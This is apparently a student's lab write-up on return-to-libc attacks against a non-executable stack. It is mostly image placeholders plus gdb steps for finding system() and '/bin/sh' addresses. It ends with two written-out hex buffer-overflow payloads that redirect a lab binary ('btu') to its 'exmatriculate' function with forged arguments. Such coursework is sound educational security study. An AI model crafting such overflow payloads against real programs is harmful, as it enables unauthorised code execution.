# Attacking Non-executable Stack
![alt text](image-29.png)
![alt text](image-30.png)

## Return to Libc Attack:
![alt text](image-31.png)
![alt text](image-32.png)

## Launching the Attack Steps:
![alt text](image-33.png)

### Task A: Finding system() address
![alt text](image-35.png)
![alt text](image-34.png)
* we must run the program in the debug mode using gdb
* then we perform run command
* then we look for the system addres:
    > gdb programName

    > run

    > p system

### Task B: Finding the address of the string "bin/sh"
![alt text](image-37.png)

![alt text](image-38.png)

* Following all the instructions given you I got these results: 
    * ![alt text](image-36.png)

### TASK C: Launching the return-to-libc attack: 
![alt text](image-39.png)
![alt text](image-40.png)
#### Function Prologue
![alt text](image-41.png)
![alt text](image-42.png)

#### Function Epilogue
![alt text](image-43.png)
![alt text](image-44.png)

#### Back to the main task
![alt text](image-45.png)
![alt text](image-46.png)

#### Lets see how to construct malicious input: 
* ![alt text](image-48.png)

* On following the instructions I got these results: 
    * ![alt text](image-47.png)

#### Writing python script to create our malicious input file: 


## Coming to our Lab
### Step1: 
* To be able to bypass the password, we can check the address of the exmatriculate function from gdb
    - ![alt text](image-53.png)
* so we can see it is **0x0804b0bb**
* then using the same code as before we can just modify the return address to be this address, and we can see that the pointer will return to the function. 
    - ![alt text](image-54.png)
* now the problem will be to send the parameters correctly because we only jump to the function, however its parameters are not loaded.
* in order to do so we must understand the structure of the stack at this point
    - payload
    - return address of the function -> exmatriculate
    - dummy return address after it finishes excution.
    - the parameters which should be our id in this case.
* So our goal now is to craft our payload in such way that we construct this successfuly, so it should be as follows: 
    - nop sled
    - exmatriculate address
    - dummy address to be excuted after finishing exmatriculate
    - our id address.
* Student id memory location: **0x08057d50**
* BTU object address is: **0x08050de0**
* this is my payload: gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\xb0\x01\x31\xdb\xb3\x05\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb0\x04\x08\xbb\xbb\xbb\xbb\xe0\x0d\x05\x08\x50\x7d\x05\x08")
* you can find the code which generates this payload at: **Buffer_Overflow/task_3_writeup.md**

gdb --args ./build/bin/btu remove 1024 $(echo -e "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb0\x04\x08\x60\x14\xdb\xf7\xe0\x0d\x05\x08\x50\x7d\x05\x08")